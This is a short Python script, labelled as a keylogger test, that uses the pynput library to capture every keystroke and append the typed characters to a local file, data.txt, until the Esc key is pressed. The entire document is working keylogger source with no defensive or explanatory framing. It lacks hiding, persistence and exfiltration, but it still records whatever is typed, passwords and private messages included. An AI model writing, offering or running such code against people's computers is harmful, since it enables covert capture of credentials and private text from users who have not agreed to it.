from pynput.keyboard import Key, Listener

def on_press(key):
    with open("data.txt", 'a') as file:
        try:
            file.write(str(key.char))
        except:
            print (key)
            file.write(" ")
        if key == Key.esc:
            return False

# Collect events until released
print ("< KeyLogger : Test >")
print ("--------------------")
print ()

with Listener(on_press=on_press) as listener:
    listener.join()
